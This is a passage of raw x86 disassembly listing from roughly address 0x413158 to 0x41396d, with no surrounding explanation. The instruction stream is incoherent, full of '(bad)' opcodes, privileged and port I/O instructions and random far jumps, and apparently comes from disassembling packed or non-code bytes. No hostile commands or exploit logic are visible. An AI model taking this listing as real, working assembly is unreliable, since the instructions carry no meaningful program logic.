  413158:	ja     0x4131b7
  41315a:	loope  0x41318d
  41315c:	push   esi
  41315d:	icebp  
  41315e:	xchg   ecx,eax
  41315f:	push   cs
  413160:	(bad)  
  413161:	sti    
  413162:	mov    al,0x3c
  413164:	push   esp
  413165:	gs adc al,0x14
  413168:	cmc    
  413169:	repz (bad) 
  41316b:	lock loope 0x4131cf
  41316e:	cdq    
  41316f:	std    
  413170:	std    
  413171:	in     eax,dx
  413172:	rcl    ch,1
  413174:	push   esi
  413175:	cmc    
  413176:	mov    ds:0x62cd476e,al
  41317b:	cld    
  41317c:	ja     0x4131f9
  41317e:	dec    edi
  41317f:	mov    ecx,cs
  413181:	loope  0x4131aa
  413183:	pop    edx
  413184:	fld1   
  413186:	jo     0x4131fe
  413188:	data16 cli 
  41318a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41318b:	stos   DWORD PTR es:[edi],eax
  41318c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41318d:	or     dh,bh
  41318f:	icebp  
  413190:	fwait
  413191:	dec    edi
  413192:	sbb    esp,DWORD PTR [ebp-0x1221dfc]
  413198:	lods   al,BYTE PTR ds:[esi]
  413199:	push   ebp
  41319a:	call   0xdb87:0x6b5f882f
  4131a1:	daa    
  4131a2:	fdiv   st(0),st
  4131a4:	cmp    eax,0xfde04cfc
  4131a9:	mov    eax,0xb925fd49
  4131ae:	sub    BYTE PTR [ebp+0x8e9d6a7],bh
  4131b4:	mov    ds:0xba9e8d38,eax
  4131b9:	dec    edi
  4131ba:	call   0x14:0x16b34ae2
  4131c1:	in     al,0x32
  4131c3:	inc    esp
  4131c4:	cmp    al,0x9b
  4131c6:	push   0x48
  4131c8:	jo     0x41318f
  4131ca:	aam    0x75
  4131cc:	dec    eax
  4131cd:	pusha  
  4131ce:	or     al,BYTE PTR ds:0x43840f51
  4131d4:	adc    ah,BYTE PTR [ecx]
  4131d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131d7:	lea    edx,[esi-0x5ddb459e]
  4131dd:	test   BYTE PTR [ecx+0x129e47d8],dh
  4131e3:	lds    edi,FWORD PTR [ecx-0x34]
  4131e6:	aaa    
  4131e7:	mov    edi,0x985eb6a1
  4131ec:	icebp  
  4131ed:	mov    ch,0x88
  4131ef:	mov    ah,0x55
  4131f1:	lods   al,BYTE PTR ds:[esi]
  4131f2:	lahf   
  4131f3:	outs   dx,DWORD PTR ds:[esi]
  4131f4:	pushf  
  4131f5:	in     al,dx
  4131f6:	xor    BYTE PTR [esi-0x5ee94b75],bl
  4131fc:	(bad)  
  4131fd:	in     al,0xa6
  4131ff:	iret   
  413200:	(bad)  
  413201:	test   dl,0x27
  413204:	int3   
  413205:	or     BYTE PTR [esp+edi*4],0x6e
  413209:	(bad)  
  41320a:	fld    st(4)
  41320c:	sub    al,0x27
  41320e:	mov    ebp,0x6cf3e591
  413213:	add    ch,BYTE PTR [ebp+0x525b73a1]
  413219:	adc    DWORD PTR [ecx+0x410ba894],0x5b7d53a
  413223:	pop    es
  413224:	and    eax,0x5576459d
  413229:	iret   
  41322a:	pop    edx
  41322b:	adc    cl,BYTE PTR [edx+eiz*4]
  41322e:	and    dh,ah
  413230:	sub    BYTE PTR [esi+esi*1+0x665fb999],al
  413237:	test   DWORD PTR [edi-0x474a7ec3],esi
  41323d:	sbb    al,0xc1
  41323f:	and    eax,0xe122726d
  413244:	inc    ecx
  413245:	sub    eax,DWORD PTR [ebx+esi*8+0x301f290]
  41324c:	shr    bl,1
  41324e:	cwde   
  41324f:	js     0x41323e
  413251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413252:	jns    0x413251
  413254:	call   0xea173287
  413259:	cmc    
  41325a:	pop    edx
  41325b:	mov    ah,0xd1
  41325d:	and    eax,0xa794127a
  413262:	out    0x46,al
  413264:	inc    ebx
  413265:	out    0x4a,al
  413267:	xor    ecx,DWORD PTR [ebp+edi*4-0x19]
  41326b:	pop    eax
  41326c:	in     al,0x16
  41326e:	adc    eax,0x694ad4dd
  413273:	jmp    0xbb5f:0x454370c7
  41327a:	cmp    eax,0xe4949d9
  41327f:	loope  0x4132ff
  413281:	xchg   esp,eax
  413282:	fidivr DWORD PTR [edi]
  413284:	mov    dh,0x97
  413286:	xlat   BYTE PTR ds:[ebx]
  413287:	xchg   al,al
  413289:	jp     0x413267
  41328b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41328d:	push   edx
  41328e:	out    dx,eax
  41328f:	sub    ebx,DWORD PTR ds:0x5ff693d7
  413295:	bnd jle 0x4132ad
  413298:	jns    0x4132d6
  41329a:	les    ecx,FWORD PTR [ebx+ebx*2+0x59110403]
  4132a1:	in     al,0x2a
  4132a3:	add    al,0x61
  4132a5:	and    BYTE PTR [edi-0x22],ch
  4132a8:	ins    DWORD PTR es:[edi],dx
  4132a9:	fmul   DWORD PTR [eax+0x34]
  4132ac:	shl    ebp,1
  4132ae:	xor    DWORD PTR [esi+ebp*8+0x61],ebp
  4132b2:	sub    ecx,DWORD PTR [edi-0x5581ebeb]
  4132b8:	push   0x3c8f987d
  4132bd:	adc    al,0x24
  4132bf:	jg     0x4132df
  4132c1:	mov    esp,DWORD PTR [edx]
  4132c3:	push   edi
  4132c4:	into   
  4132c5:	jbe    0x4132ac
  4132c7:	push   ecx
  4132c8:	mov    dl,BYTE PTR [edx]
  4132ca:	leave  
  4132cb:	(bad)  
  4132cc:	xor    eax,0x5038dbdc
  4132d1:	dec    edi
  4132d2:	and    eax,0x90a0119f
  4132d7:	popa   
  4132d8:	pop    ss
  4132d9:	jb     0x413329
  4132db:	(bad)  
  4132dc:	ret    
  4132dd:	mov    dh,0xb4
  4132df:	mov    ecx,0x7ddf5e63
  4132e4:	rcl    DWORD PTR [edx],1
  4132e6:	std    
  4132e7:	push   ecx
  4132e8:	jne    0x413344
  4132ea:	stc    
  4132eb:	inc    ecx
  4132ec:	add    BYTE PTR [ebp-0x28302fcb],dl
  4132f2:	sub    bl,cl
  4132f4:	dec    ebp
  4132f5:	arpl   WORD PTR [edi-0x5],bx
  4132f8:	into   
  4132f9:	inc    ecx
  4132fa:	out    0xaf,al
  4132fc:	pop    ss
  4132fd:	popf   
  4132fe:	fmul   QWORD PTR [eax-0x290d8c11]
  413304:	or     dl,ch
  413306:	sub    al,BYTE PTR [edx]
  413308:	and    al,0xc8
  41330a:	test   eax,0x672c5c4d
  41330f:	push   edi
  413310:	cs mov ah,0xac
  413313:	jno    0x4132c6
  413315:	std    
  413316:	sbb    ebp,ecx
  413318:	sti    
  413319:	leave  
  41331a:	(bad)  
  41331b:	ins    BYTE PTR es:[edi],dx
  41331c:	add    DWORD PTR [eax-0x7803b2c4],edx
  413322:	inc    ecx
  413323:	shl    BYTE PTR [ecx+edx*4+0x2],1
  413327:	xor    eax,0x7704d842
  41332c:	sbb    al,0x83
  41332e:	pop    ebx
  41332f:	or     ebx,esp
  413331:	(bad)  
  413332:	ins    BYTE PTR es:[edi],dx
  413333:	(bad)  
  413335:	xchg   esi,eax
  413336:	inc    eax
  413337:	xchg   esi,eax
  413338:	cmp    eax,DWORD PTR [ebx]
  41333a:	cmp    DWORD PTR [ecx+0x48747707],0xffffffcb
  413341:	(bad)  [edx+0x5ade19a9]
  413347:	inc    esi
  413348:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413349:	xchg   esi,eax
  41334a:	shl    BYTE PTR [ecx+eax*4],0x78
  41334e:	jno    0x413372
  413350:	es daa 
  413352:	xlat   BYTE PTR ds:[ebx]
  413353:	sbb    BYTE PTR [ebx],bl
  413355:	cmp    al,0x80
  413357:	ja     0x4132f0
  413359:	xor    BYTE PTR [edx],0x9f
  41335c:	sbb    BYTE PTR [ebx-0x5d],ah
  41335f:	mov    edx,0x363b9adc
  413364:	inc    esi
  413365:	cmp    dh,BYTE PTR [edi-0x7825599]
  41336b:	mov    WORD PTR [edi-0x7f69c16c],?
  413371:	(bad)  
  413372:	cdq    
  413373:	cmp    esi,esi
  413375:	rol    DWORD PTR [edx],1
  413377:	mov    eax,ds:0x526aff33
  41337c:	inc    ecx
  41337d:	push   esi
  41337e:	repnz dec ebp
  413380:	test   DWORD PTR [ebx],edi
  413382:	push   ecx
  413383:	jns    0x41337c
  413385:	dec    ebx
  413386:	mov    edi,0x2a4bf522
  41338b:	(bad)  
  41338c:	adc    bl,BYTE PTR ds:[eax-0x459c90e]
  413393:	neg    BYTE PTR [eax+0x46add4ae]
  413399:	jmp    0x413363
  41339b:	mov    dl,0x87
  41339d:	mov    ch,0x5b
  41339f:	ins    DWORD PTR es:[edi],dx
  4133a0:	cmp    BYTE PTR [edi-0x5ade0ceb],ch
  4133a6:	(bad)  
  4133a8:	out    0x52,eax
  4133aa:	or     BYTE PTR [ebp+0x5c8c996],ch
  4133b0:	gs push esi
  4133b2:	and    esi,DWORD PTR [ebp+0x1f]
  4133b5:	in     al,dx
  4133b6:	mov    bl,0x3b
  4133b8:	stc    
  4133b9:	fxch   st(4)
  4133bb:	or     eax,0x45210dfc
  4133c0:	jo     0x41343c
  4133c2:	jno    0x4133ab
  4133c4:	push   esi
  4133c5:	popf   
  4133c6:	sub    cl,dh
  4133c8:	sar    DWORD PTR [ebx+eiz*2],0x77
  4133cc:	xor    al,0xaf
  4133ce:	int    0xae
  4133d0:	enter  0x846c,0xb0
  4133d4:	retf   
  4133d5:	sub    esp,DWORD PTR [ecx+0x7d5720e5]
  4133db:	mov    ecx,0x836f2870
  4133e0:	mov    al,0xfd
  4133e2:	add    DWORD PTR [ecx+0x4f],0x69
  4133e6:	mov    BYTE PTR [edx+ebp*8-0x5fe58254],al
  4133ed:	jb     0x41339b
  4133ef:	add    al,0x1f
  4133f1:	push   0x65894407
  4133f6:	pop    esp
  4133f7:	ror    DWORD PTR [edx+0x73],1
  4133fa:	int3   
  4133fb:	jl     0x413448
  4133fd:	or     cl,BYTE PTR [esi+0xb0786a3]
  413403:	xor    cl,al
  413405:	or     edx,DWORD PTR [edi]
  413407:	cmp    eax,0xd48cd44c
  41340c:	js     0x413412
  41340e:	xlat   BYTE PTR ds:[ebx]
  41340f:	fisub  DWORD PTR ds:0x32a8feaa
  413415:	rcl    DWORD PTR [ebx+0x30e51b5d],0x4c
  41341c:	push   es
  41341d:	and    DWORD PTR [ebp+eax*2+0x77],0xe
  413422:	xor    BYTE PTR [edx+ebx*4-0x4c],0xd8
  413427:	sub    BYTE PTR [edi-0x64d50cd4],cl
  41342d:	ret    
  41342e:	pop    edi
  41342f:	sbb    dh,bl
  413431:	lock adc eax,0xff29dce8
  413437:	call   0x2cf576e4
  41343c:	stos   BYTE PTR es:[edi],al
  41343d:	mov    cl,0xb4
  41343f:	mov    ah,0xdc
  413441:	loope  0x4133db
  413443:	inc    ecx
  413444:	stos   DWORD PTR es:[edi],eax
  413445:	in     al,0x73
  413447:	mov    ds:0x6113f029,eax
  41344c:	mov    BYTE PTR [edi],dl
  41344e:	ret    0xe046
  413451:	enter  0x6ccf,0xbb
  413455:	jecxz  0x41344e
  413457:	jmp    0xa01cccbc
  41345c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41345d:	clc    
  41345e:	add    BYTE PTR ds:0x3cabd3b9,bl
  413464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413465:	jne    0x413490
  413467:	sbb    BYTE PTR [edi],bl
  413469:	or     ch,dh
  41346b:	ds xchg ecx,eax
  41346d:	sar    DWORD PTR [edx-0x46],0xb5
  413471:	lahf   
  413472:	mov    al,ds:0xdf69bfd1
  413477:	dec    edx
  413478:	mov    edx,0x91fb75a5
  41347d:	mov    ds:0x350467f,eax
  413482:	jl     0x413404
  413484:	les    ebp,FWORD PTR [ecx]
  413486:	push   cs
  413487:	fs sbb ebx,eax
  41348a:	xor    eax,0xb786c953
  41348f:	jmp    0x4134e0
  413491:	jno    0x413504
  413493:	push   ebp
  413494:	inc    ebp
  413495:	dec    eax
  413496:	(bad)  
  413497:	jmp    0x41348d
  413499:	add    edi,esi
  41349b:	jne    0x41349f
  41349d:	jbe    0x413466
  41349f:	mov    bl,0x5f
  4134a1:	jle    0x413498
  4134a3:	retf   0x4480
  4134a6:	pop    edi
  4134a7:	push   eax
  4134a8:	test   DWORD PTR [ebx+0x38],esi
  4134ab:	xor    DWORD PTR [ecx+0x3591fa7],esi
  4134b1:	fisttp WORD PTR [eax]
  4134b3:	add    dl,dl
  4134b5:	jmp    0x3ab601b1
  4134ba:	push   0x6ef37faf
  4134bf:	aaa    
  4134c0:	or     BYTE PTR [eax-0x17534f2e],al
  4134c6:	dec    eax
  4134c7:	lods   al,BYTE PTR ds:[esi]
  4134c8:	scas   eax,DWORD PTR es:[edi]
  4134c9:	aaa    
  4134ca:	call   0xf5eb:0x1cf48729
  4134d1:	fiadd  DWORD PTR [edi+0x7b]
  4134d4:	sbb    bh,BYTE PTR [ebx+0x28]
  4134d7:	inc    eax
  4134d8:	pop    eax
  4134d9:	shr    ch,1
  4134db:	(bad)  
  4134dc:	fstp   QWORD PTR [ebx+0x10e942c4]
  4134e2:	and    ch,BYTE PTR [esi]
  4134e4:	out    dx,eax
  4134e5:	test   BYTE PTR [edi+0x492ecc7],0x12
  4134ec:	xlat   BYTE PTR ds:[ebx]
  4134ed:	jge    0x4134b7
  4134ef:	and    bh,BYTE PTR [edx]
  4134f1:	stc    
  4134f2:	add    dh,BYTE PTR [edi]
  4134f4:	mov    BYTE PTR [ebp+0x57],dl
  4134f7:	enter  0x40c8,0x96
  4134fb:	xchg   ecx,eax
  4134fc:	ins    DWORD PTR es:[edi],dx
  4134fd:	mov    dh,0xb9
  4134ff:	hlt    
  413500:	xchg   edi,eax
  413501:	shl    BYTE PTR [ebp+0x3a01bae],0xd8
  413508:	pop    ebx
  413509:	inc    edi
  41350a:	nop
  41350b:	mov    BYTE PTR ds:0xfef949b9,bl
  413511:	pop    esp
  413512:	std    
  413513:	jne    0x41350f
  413515:	sti    
  413516:	shr    BYTE PTR [edx+0x75],0x94
  41351a:	jae    0x4134ee
  41351c:	addr16 sbb al,0x6d
  41351f:	sbb    al,0x72
  413521:	fcom   QWORD PTR [ecx+0x38]
  413524:	xor    DWORD PTR [ecx+eiz*1],ebp
  413527:	rol    al,1
  413529:	pop    esi
  41352a:	lahf   
  41352b:	fldln2 
  41352d:	mov    ?,WORD PTR [eax+0x576087a2]
  413533:	mov    bl,0x9
  413535:	ror    DWORD PTR [edx],0xd2
  413538:	push   eax
  413539:	out    dx,al
  41353a:	adc    eax,DWORD PTR [edx+0x49]
  41353d:	js     0x4135ad
  41353f:	mov    edx,0x1ad0fba1
  413544:	(bad)  
  413545:	mov    eax,ds:0x1f20571b
  41354a:	lods   al,BYTE PTR ds:[esi]
  41354b:	cmp    eax,DWORD PTR [ecx-0x2d]
  41354e:	data16 jg 0x413515
  413551:	retf   
  413552:	mov    WORD PTR [ecx+eax*4+0xa486c50],cs
  413559:	jecxz  0x413516
  41355b:	xor    DWORD PTR ds:0xdd3306b1,0xe873221e
  413565:	mov    bh,BYTE PTR ds:0x4b36463
  41356b:	mov    bh,al
  41356d:	aad    0x4f
  41356f:	adc    al,0x85
  413571:	push   ds
  413572:	pusha  
  413573:	push   cs
  413574:	repnz pop ecx
  413576:	push   eax
  413577:	popa   
  413578:	imul   esp,DWORD PTR [eax],0x68
  41357b:	xchg   ecx,eax
  41357c:	mov    eax,0xdd8f7091
  413581:	push   0x33
  413583:	add    ecx,DWORD PTR ds:0xcc2f7734
  413589:	jp     0x413572
  41358b:	sbb    al,0x7b
  41358d:	dec    edi
  41358e:	xchg   edi,eax
  41358f:	imul   edx,DWORD PTR [edi-0x4b4dd67b],0xf3797e85
  413599:	fistp  WORD PTR [edx+ecx*2-0x1]
  41359d:	ret    
  41359e:	mov    ah,ah
  4135a0:	mov    dh,0xc
  4135a2:	fld    DWORD PTR [ebp-0x531e00d]
  4135a8:	test   eax,0xf987510
  4135ad:	ret    
  4135ae:	into   
  4135af:	push   DWORD PTR [eax+0x30ead1fc]
  4135b5:	fsub   DWORD PTR [edi+0x58e1e711]
  4135bb:	mov    esi,0x7e4c0f0f
  4135c0:	xchg   ecx,eax
  4135c1:	jg     0x41356f
  4135c3:	sbb    cl,BYTE PTR [edx+0x3e2ea6e1]
  4135c9:	pop    ss
  4135ca:	pop    esi
  4135cb:	cli    
  4135cc:	sbb    al,0x64
  4135ce:	inc    ebp
  4135cf:	in     eax,0x99
  4135d1:	mov    ebx,0x6baa318e
  4135d6:	add    al,0x80
  4135d8:	sbb    BYTE PTR [ecx+0x782c7a8f],al
  4135de:	aaa    
  4135df:	in     eax,0x9f
  4135e1:	(bad)  
  4135e2:	cmc    
  4135e3:	sar    DWORD PTR ds:0x2aeb5835,cl
  4135e9:	cmp    eax,0x8cec2565
  4135ee:	into   
  4135ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135f0:	cmp    DWORD PTR [ebx],0x66
  4135f3:	ret    
  4135f4:	adc    bl,BYTE PTR [eax+ecx*4-0x5eeeb9c1]
  4135fb:	push   ax
  4135fd:	fcom   QWORD PTR [edx+0x12]
  413600:	cmp    dh,BYTE PTR [esi]
  413602:	repz test DWORD PTR [ebx-0x4b],ecx
  413606:	jecxz  0x413612
  413608:	cli    
  413609:	test   eax,0xd3569a32
  41360e:	mov    BYTE PTR [eax+0x158b5ce2],ch
  413614:	out    dx,eax
  413615:	vmwrite ebx,DWORD PTR [esi-0x9bb1ce6]
  41361c:	repz jo 0x413640
  41361f:	aaa    
  413620:	stos   DWORD PTR es:[edi],eax
  413621:	add    ch,BYTE PTR [ebx+eiz*1-0x784b67fa]
  413628:	jb     0x41363e
  41362a:	push   esp
  41362b:	pop    ss
  41362c:	add    al,0xd1
  41362e:	icebp  
  41362f:	jge    0x413658
  413631:	and    edi,DWORD PTR [edx]
  413633:	xchg   esp,eax
  413634:	rol    DWORD PTR [ebx+0xa17f5a0],1
  41363a:	cdq    
  41363b:	cmp    BYTE PTR [ebp+0x6e],ch
  41363e:	or     al,0x70
  413640:	or     DWORD PTR [esp+ebp*4-0x15],esp
  413644:	leave  
  413645:	mov    DWORD PTR [eax-0x52981836],0x3364da5c
  41364f:	cmp    DWORD PTR [ebx],ecx
  413651:	psllq  mm3,mm6
  413654:	outs   dx,BYTE PTR ds:[esi]
  413655:	fimul  DWORD PTR [eax+0xf]
  413658:	fdiv   st,st(1)
  41365a:	dec    ecx
  41365b:	nop
  41365c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41365d:	xor    al,0xe5
  41365f:	push   ebx
  413660:	pop    es
  413661:	push   edi
  413662:	stos   BYTE PTR es:[edi],al
  413663:	fcom   QWORD PTR [edi+0x16]
  413666:	push   ds
  413667:	not    DWORD PTR [ecx+esi*2+0x3c31d6b3]
  41366e:	mov    ds:0x85503ba0,al
  413673:	pushf  
  413674:	adc    eax,0xb97eaaa6
  413679:	xchg   esp,eax
  41367a:	cld    
  41367b:	sti    
  41367c:	adc    bh,BYTE PTR [eax+0x12f7011d]
  413682:	test   esp,ecx
  413684:	ins    BYTE PTR es:[edi],dx
  413685:	adc    bl,BYTE PTR [eax]
  413687:	test   BYTE PTR [esi+0xd6d4743],0xcd
  41368e:	mov    BYTE PTR [ebp-0x30],dh
  413691:	mov    ecx,0x9120fb4e
  413696:	mov    dl,0xf3
  413698:	mov    WORD PTR [ecx-0x499fa187],gs
  41369e:	xlat   BYTE PTR ds:[ebx]
  41369f:	mov    ah,0x69
  4136a1:	pop    ecx
  4136a2:	and    cl,0x80
  4136a5:	in     al,0x62
  4136a7:	xor    DWORD PTR [eax+0x1b],edi
  4136aa:	ja     0x413689
  4136ac:	out    0x8d,eax
  4136ae:	ss dec ecx
  4136b0:	push   0x3ff7fbdb
  4136b5:	jle    0x4136c2
  4136b7:	inc    edx
  4136b8:	es cmp ebp,ebx
  4136bb:	rcl    BYTE PTR [ecx-0x64f27f1b],1
  4136c1:	dec    eax
  4136c2:	mov    BYTE PTR ss:[ebx-0x40ae9390],al
  4136c9:	fcmovu st,st(6)
  4136cb:	shl    ch,cl
  4136cd:	push   ecx
  4136ce:	cmp    al,0xd7
  4136d0:	inc    ebx
  4136d1:	mov    BYTE PTR [esi+0x19ad24be],dh
  4136d7:	lods   eax,DWORD PTR ds:[esi]
  4136d8:	mov    ecx,0x8c2e9bec
  4136dd:	sub    DWORD PTR [eax],edi
  4136df:	pushf  
  4136e0:	dec    ebp
  4136e1:	and    BYTE PTR [ecx+edx*4],al
  4136e4:	push   edx
  4136e5:	dec    edx
  4136e6:	mov    bh,0xfa
  4136e8:	shr    BYTE PTR [ebp-0x8a43984],0xb2
  4136ef:	int    0xb8
  4136f1:	pop    edi
  4136f2:	cmp    edx,DWORD PTR [eax+edi*4]
  4136f5:	xchg   ebx,eax
  4136f6:	and    DWORD PTR [eax+0x64609b07],ebp
  4136fc:	mov    dh,0xdf
  4136fe:	aas    
  4136ff:	in     eax,dx
  413700:	mov    al,ds:0xc93ee9c0
  413705:	dec    eax
  413706:	aad    0x30
  413708:	mov    ebx,0x82fb3035
  41370d:	hlt    
  41370e:	jl     0x4136f5
  413710:	daa    
  413711:	inc    ecx
  413712:	inc    eax
  413713:	inc    eax
  413714:	inc    edx
  413715:	mov    ds:0x88a79594,eax
  41371a:	and    eax,0xf78db21a
  41371f:	loopne 0x41374d
  413721:	(bad)  
  413723:	dec    ebp
  413724:	mov    esp,0x4011cc19
  413729:	inc    edi
  41372a:	ins    BYTE PTR es:[edi],dx
  41372b:	addr16 jb 0x4136fd
  41372e:	inc    edi
  41372f:	mov    esp,0xba39756
  413734:	imul   ebx,DWORD PTR [edx+0x19],0xffffffc4
  413738:	xchg   ebx,eax
  413739:	cmc    
  41373a:	cmp    bh,BYTE PTR [ecx+0x4101eba5]
  413740:	lock xchg esp,eax
  413742:	mov    esp,0xe77b3e03
  413747:	jbe    0x413760
  413749:	outs   dx,DWORD PTR ds:[esi]
  41374a:	sub    cl,bl
  41374c:	cmp    ebx,DWORD PTR [ebx]
  41374e:	jbe    0x4137a4
  413750:	addr16 jp 0x413785
  413753:	mov    esp,0x47829cfe
  413758:	cwde   
  413759:	in     al,dx
  41375a:	jl     0x41377d
  41375c:	mov    edi,0x1e213900
  413761:	xchg   ebp,eax
  413762:	pop    esp
  413763:	dec    ecx
  413764:	jp     0x4137ae
  413766:	dec    esi
  413767:	push   0x969a5766
  41376c:	sub    dl,BYTE PTR [esi+0x4cb2d36e]
  413772:	call   0xb46fb620
  413777:	sub    eax,0x7301dd96
  41377c:	xchg   DWORD PTR [eax],edx
  41377e:	adc    BYTE PTR [ebp-0x6c199493],ch
  413784:	xor    al,0xc2
  413786:	das    
  413787:	sbb    al,0xba
  413789:	adc    ecx,ecx
  41378b:	loop   0x413796
  41378d:	mov    eax,0x6cce1408
  413792:	mov    ds:0x13353ab4,al
  413797:	mov    bh,BYTE PTR [edx+0x60]
  41379a:	pop    eax
  41379c:	jne    0x4137c9
  41379e:	push   esp
  41379f:	loopne 0x4137ba
  4137a1:	fist   DWORD PTR [edi]
  4137a3:	retf   
  4137a4:	dec    edi
  4137a5:	cwde   
  4137a6:	mov    bh,0x1b
  4137a8:	xor    DWORD PTR [esi-0x33d77988],edx
  4137ae:	or     eax,esi
  4137b0:	idiv   DWORD PTR [edi+esi*8+0xd]
  4137b4:	pop    edi
  4137b5:	jmp    0x413798
  4137b7:	adc    dl,ah
  4137b9:	not    DWORD PTR [ecx+0x68]
  4137bc:	loopne 0x4137c1
  4137be:	adc    al,BYTE PTR [ebp+0x28]
  4137c1:	add    DWORD PTR [edx+0x2e],ebp
  4137c4:	mov    ch,0x42
  4137c6:	js     0x4137ce
  4137c8:	aad    0xdd
  4137ca:	sti    
  4137cb:	push   ecx
  4137cc:	add    DWORD PTR [edx],ebx
  4137ce:	xchg   esp,eax
  4137cf:	and    BYTE PTR [eax+0x45],cl
  4137d2:	jmp    0xbdd6d044
  4137d7:	ficom  DWORD PTR [esi]
  4137d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137da:	lahf   
  4137db:	ret    
  4137dc:	pop    ebx
  4137dd:	dec    esp
  4137de:	inc    eax
  4137df:	inc    eax
  4137e0:	test   edx,ebx
  4137e2:	loop   0x413842
  4137e4:	sbb    DWORD PTR [esi+0x65],ebp
  4137e7:	int    0x54
  4137e9:	repnz push ds
  4137eb:	sbb    al,0xb2
  4137ed:	mov    ecx,?
  4137ef:	sahf   
  4137f0:	enter  0x244a,0xd7
  4137f4:	rol    BYTE PTR [eax+0x7d8cc5db],0xb8
  4137fb:	rsqrtps xmm7,XMMWORD PTR [esi+edx*8+0x20]
  413800:	pop    edi
  413801:	sti    
  413802:	loop   0x413846
  413804:	mov    edi,0x4dc9c5a7
  413809:	sub    ah,dl
  41380b:	push   ds
  41380c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41380d:	in     al,dx
  41380e:	test   BYTE PTR [ebp-0x4536a70c],ch
  413814:	jnp    0x413866
  413816:	sahf   
  413817:	inc    ecx
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	imul   ebx,edx,0x5986d011
  41381f:	fbld   TBYTE PTR [esi+0x39]
  413822:	xchg   BYTE PTR [ebx-0x7932f249],bh
  413828:	daa    
  413829:	sub    ebp,DWORD PTR [ebp+0x5f]
  41382c:	sbb    DWORD PTR [esi-0x39],ebp
  41382f:	test   BYTE PTR [ebx+0x20],cl
  413832:	mov    al,ds:0xebbab174
  413837:	mov    ebx,0x2fba55f2
  41383c:	(bad)  
  41383d:	js     0x4137ee
  41383f:	sbb    eax,0x7f7a27dd
  413844:	retf   0xe97e
  413847:	sbb    eax,0xc21ffe80
  41384c:	xor    eax,0x6574bba0
  413851:	jnp    0x4138a6
  413853:	sbb    BYTE PTR [edx+0x27b30e6c],al
  413859:	mov    DWORD PTR [eax],edx
  41385b:	and    esp,0xb77ba4d6
  413861:	rcl    DWORD PTR [ecx+0x6c2ea624],cl
  413867:	(bad)  
  413868:	jb     0x41384f
  41386a:	mov    edx,0xd6062a05
  41386f:	add    dh,BYTE PTR [esi-0x65ef76ed]
  413875:	cdq    
  413876:	jp     0x4138d1
  413878:	int    0x93
  41387a:	mov    BYTE PTR [ebx+0x1bdc441f],al
  413880:	mov    esi,0x47d0493a
  413885:	add    edi,esi
  413887:	cli    
  413888:	sbb    esp,ecx
  41388a:	dec    eax
  41388b:	lods   eax,DWORD PTR ds:[esi]
  41388c:	dec    ebp
  41388d:	retf   
  41388e:	mov    ah,0x36
  413890:	and    al,0x61
  413892:	loope  0x4138b1
  413894:	out    dx,al
  413895:	fcomp  st(1)
  413897:	and    bl,BYTE PTR [ebx+0x75a1b2f9]
  41389d:	sti    
  41389e:	mov    ah,bh
  4138a0:	enter  0x5d15,0xf3
  4138a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138a5:	mov    ebx,0x64fb5eae
  4138aa:	cmc    
  4138ab:	retf   0xbc14
  4138ae:	lock or edx,edi
  4138b1:	outs   dx,BYTE PTR ds:[esi]
  4138b2:	stos   BYTE PTR es:[edi],al
  4138b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138b4:	jno    0x413898
  4138b6:	jnp    0x4138a4
  4138b8:	out    dx,eax
  4138b9:	pop    ds
  4138ba:	adc    eax,0xb2c4cad
  4138bf:	sbb    ebp,DWORD PTR [edi-0x66939989]
  4138c5:	dec    edi
  4138c6:	jb     0x4138fb
  4138c8:	xchg   BYTE PTR [eax-0x4],ah
  4138cb:	or     al,0x67
  4138cd:	int3   
  4138ce:	mov    eax,0xafadd1bc
  4138d3:	enter  0xd817,0x6c
  4138d7:	sub    bl,BYTE PTR [ebp+0x2e59c65e]
  4138dd:	sub    eax,0x332201e6
  4138e2:	or     al,0x33
  4138e4:	sar    DWORD PTR [edi],cl
  4138e6:	push   0xa1a7c582
  4138eb:	or     al,0x33
  4138ed:	and    ecx,DWORD PTR [ebx+0x531b62d5]
  4138f3:	fidiv  DWORD PTR [edx+0x3f614194]
  4138f9:	pop    es
  4138fa:	xchg   esp,eax
  4138fb:	fptan  
  4138fd:	pop    esi
  4138fe:	push   es
  4138ff:	mov    ds:0x7c50d719,al
  413904:	or     bh,BYTE PTR [ebp+eax*2-0x66]
  413908:	push   es
  413909:	rcl    edx,cl
  41390b:	imul   esi,ecx,0x81ab417a
  413911:	add    eax,0xc9b8d537
  413916:	call   0x9f66a1db
  41391b:	(bad)  
  41391c:	jmp    0x94c4:0x878ff3b5
  413923:	adc    DWORD PTR [ecx],0xd251f692
  413929:	and    dl,BYTE PTR [edi]
  41392b:	mov    dh,BYTE PTR [eax-0x64]
  41392e:	sbb    BYTE PTR ds:0xe9388fcc,0xf8
  413935:	sbb    BYTE PTR ds:0xdb0d366d,dh
  41393b:	cmp    al,0x5f
  41393d:	js     0x41399e
  41393f:	jb     0x4138d4
  413941:	sbb    bl,dh
  413943:	adc    bh,BYTE PTR [ebx+ebx*8]
  413946:	dec    ebx
  413947:	ror    BYTE PTR [eax],0xa2
  41394a:	arpl   WORD PTR [edi-0xe],bx
  41394d:	inc    edx
  41394e:	loope  0x413922
  413950:	shl    edx,1
  413952:	aam    0x2d
  413954:	cmp    BYTE PTR [ecx],dh
  413956:	fisttp WORD PTR ds:0xd5473cd4
  41395c:	jo     0x4138e7
  41395e:	popf   
  41395f:	xchg   ebx,eax
  413960:	sbb    esp,DWORD PTR [edx+0x5d]
  413963:	int    0xee
  413965:	push   es
  413966:	xchg   ecx,eax
  413967:	adc    BYTE PTR [edx+0x1f49dc0f],ah
  41396d:	cmp    BYTE PTR [ecx],al
